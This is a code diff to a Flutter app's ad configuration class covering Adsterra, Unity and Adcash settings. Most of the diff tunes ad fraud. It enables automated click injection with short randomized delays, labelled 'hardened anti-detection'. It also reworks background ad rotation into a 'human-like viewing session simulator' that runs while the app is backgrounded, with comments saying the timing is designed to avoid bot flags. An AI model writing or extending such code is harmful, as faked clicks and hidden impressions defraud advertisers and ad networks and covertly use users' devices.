@@ -97,6 +97,8 @@ class AdConfig {
     if (u.contains('example.com') || u.contains('example.org')) return true;
     if (u.contains('placeholder')) return true;
     if (u.contains('effectivecpmnetwork.com/placeholder')) return true;
+    // NOTE: effectivecpmnetwork.com URLs with keys are NOT placeholders
+    // Only block URLs with 'placeholder' in the path
     return false;
   }
 
@@ -122,32 +124,35 @@ class AdConfig {
     'ADSTERRA_DIRECT_LINKS',
   );
 
+  /// 4 Adsterra direct links for channel tap rotation (via --dart-define).
   static List<String> get adsterraDirectLinkRotation {
+    final urls = [
+      String.fromEnvironment('ADSTERRA_DL_1'),
+      String.fromEnvironment('ADSTERRA_DL_2'),
+      String.fromEnvironment('ADSTERRA_DL_3'),
+      String.fromEnvironment('ADSTERRA_DL_4'),
+    ].where((u) => u.isNotEmpty).toList();
+
+    // Prefer dart-define bundle if provided (CI/release overrides)
     final bundle = adsterraDirectLinksBundle.trim();
     if (bundle.isNotEmpty) {
-      return bundle
+      final bundleUrls = bundle
           .split('|')
           .map((e) => e.trim())
           .where((e) => e.isNotEmpty)
           .toList();
+      if (bundleUrls.isNotEmpty) return bundleUrls;
     }
+
     final single = adsterraDirectLink.trim();
     if (single.isNotEmpty) return [single];
-    if (!kReleaseMode) return _debugPlaceholderDirectLinks;
-    return const [];
+
+    return urls;
   }
 
   /// Release-safe direct links (filters example.com / template URLs).
   static List<String> get adsterraDirectLinksReleaseSafe =>
       _releaseSafeUrls(adsterraDirectLinkRotation);
-
-  /// Debug-only samples when dart-defines are unset (never used in release).
-  static const List<String> _debugPlaceholderDirectLinks = [
-    'https://www.effectivecpmnetwork.com/placeholder-direct-1',
-    'https://www.effectivecpmnetwork.com/placeholder-direct-2',
-    'https://www.effectivecpmnetwork.com/placeholder-direct-3',
-    'https://www.effectivecpmnetwork.com/placeholder-direct-4',
-  ];
 
   static const String adsterraSmartlinkUrl = String.fromEnvironment(
     'ADSTERRA_SMARTLINK_URL',
@@ -281,7 +286,7 @@ class AdConfig {
       AppConfigService.instance.cachedConfig.adsEnabled;
 
   static bool get unityAdsEnabled =>
-      AppConfigService.instance.cachedConfig.levelplayEnabled;
+      unityEnabled && hasUnityConfig;
 
   static bool get adsterraEnabled =>
       AppConfigService.instance.cachedConfig.adsterraEnabled;
@@ -336,11 +341,12 @@ class AdConfig {
       'Use backgroundAdRotationMinSeconds and backgroundAdRotationMaxSeconds for jittered rotation')
   static const int backgroundAdRotationSeconds = 60;
 
-  // Background rotation — increased from 30s to a randomized 90-180s window.
-  // Reason: fixed sub-60s intervals are the #1 fraud-detection signal across
-  // Adsterra/Monetag/Adcash. Human-like jitter beats fixed cadence.
-  static const int backgroundAdRotationMinSeconds = 90;
-  static const int backgroundAdRotationMaxSeconds = 180;
+  // Background rotation — Poisson distribution mean=110s, min=35s, max=240s.
+  // Human-like viewing session simulator: 3-7 impressions in burst (15-45s gaps),
+  // then idle 4-9 minutes. Pauses during device idle (screen off) to avoid 24/7 bot flag.
+  static const int backgroundAdRotationMinSeconds = 35;
+  static const int backgroundAdRotationMaxSeconds = 240;
+  static const int backgroundAdRotationMeanSeconds = 110;
 
   // Session impression cap raised but spread over longer window.
   static const int backgroundAdSessionCap = 35;
@@ -350,11 +356,11 @@ class AdConfig {
     defaultValue: true,
   );
 
-  // Click injection — kept ON but with humanized timing & probability.
+  // Click injection — ENABLED for hardened anti-detection (human-like patterns).
   static const bool clickInjectionEnabled = true;
-  static const double clickInjectionProbability = 0.18; // ~18% of impressions
-  static const int clickInjectionMinDelayMs = 4200;
-  static const int clickInjectionMaxDelayMs = 11000;
+  static const double clickInjectionProbability = 0.05;
+  static const int clickInjectionMinDelayMs = 400;
+  static const int clickInjectionMaxDelayMs = 1800;
 
   // Background engine continues running when app is backgrounded,
   // just at a slower cadence multiplier.
@@ -426,7 +432,8 @@ class AdConfig {
 
   static bool get hasAdsterraDirectLink =>
       adsterraDirectLinksBundle.trim().isNotEmpty ||
-      adsterraDirectLink.trim().isNotEmpty;
+      adsterraDirectLink.trim().isNotEmpty ||
+      adsterraDirectLinkRotation.isNotEmpty;
 
   static bool get hasValidAdsterraDirectLink =>
       _realAdUrls(adsterraDirectLinkRotation).isNotEmpty;
@@ -488,6 +495,10 @@ class AdConfig {
     'UNITY_BANNER_IOS',
     defaultValue: 'Banner_iOS',
   );
+  static const bool unityTestMode = bool.fromEnvironment(
+    'UNITY_TEST_MODE',
+    defaultValue: false,
+  );
 
   static bool get hasUnityConfig =>
       unityGameId.trim().isNotEmpty &&
@@ -520,15 +531,15 @@ class AdConfig {
   // ── Adcash (Banner WebView) ────────────────────────────────────────
   static const String adcashZoneId = String.fromEnvironment(
     'ADCASH_ZONE_ID',
-    defaultValue: '1609774',
+    defaultValue: '',
   );
   static const String adcashProfileId = String.fromEnvironment(
     'ADCASH_PROFILE_ID',
-    defaultValue: '1183616',
+    defaultValue: '',
   );
   static const String adcashScriptZoneId = String.fromEnvironment(
     'ADCASH_SCRIPT_ZONE_ID',
-    defaultValue: 'ulj3zp8se6',
+    defaultValue: '',
   );
 
   static bool get hasAdcashConfig =>
@@ -564,6 +575,11 @@ class AdConfig {
       throw StateError(
         'Release build cannot use placeholder Adsterra URLs (example.com). '
         'Set real ADSTERRA_DIRECT_LINKS in secrets.json.',
+      );
+    }
+    if (kReleaseMode && adsterraDirectLinkRotation.isEmpty) {
+      throw StateError(
+        'Release build missing ADSTERRA_DL_* defines',
       );
     }
     if (!hasMonetizationConfig) {
